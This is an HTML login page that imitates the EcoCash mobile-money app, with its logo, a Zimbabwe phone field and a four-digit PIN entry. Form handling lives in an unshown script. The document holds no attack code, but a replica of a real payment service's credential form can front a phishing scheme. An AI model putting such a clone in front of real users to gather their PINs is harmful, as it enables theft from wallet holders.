<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>EcoCash — Login</title>
  <link rel="stylesheet" href="css/styles.css" />
</head>
<body class="login-body">
  <main class="login-screen">
    <img src="assets/ecocash-logo.png" alt="EcoCash" class="logo-img logo-img--lg" />
    <h1 class="welcome-heading">Welcome</h1>

    <form id="login-form" class="login-top" novalidate>
      <div class="phone-field">
        <span class="phone-prefix">
          <span class="flag" aria-hidden="true">🇿🇼</span>
          <span class="code">+263</span>
        </span>
        <input
          type="tel"
          id="phone"
          class="phone-input"
          inputmode="numeric"
          value="0"
          aria-label="Phone number"
        />
      </div>

      <p class="pin-label">Enter your PIN</p>
      <div class="pin-group" id="pin-group">
        <input type="password" inputmode="numeric" maxlength="1" class="pin-box" aria-label="PIN digit 1" />
        <input type="password" inputmode="numeric" maxlength="1" class="pin-box" aria-label="PIN digit 2" />
        <input type="password" inputmode="numeric" maxlength="1" class="pin-box" aria-label="PIN digit 3" />
        <input type="password" inputmode="numeric" maxlength="1" class="pin-box" aria-label="PIN digit 4" />
      </div>
      <a href="#" class="forgot-link">Forgot PIN?</a>

      <div class="login-curve">
        <button type="submit" class="btn-login" id="login-btn">Login</button>
      </div>
    </form>

    <section class="login-bottom">
      <p class="register-prompt">To register an EcoCash wallet or get assistance, click below</p>
      <div class="register-actions">
        <button type="button" class="btn-pill">Register</button>
        <button type="button" class="btn-pill">Help &amp; Support</button>
      </div>
      <p class="version">v2.1.3P</p>
      <p class="terms">By signing in you agree to the Terms and Conditions</p>
    </section>
  </main>

  <script src="js/app.js"></script>
</body>
</html>
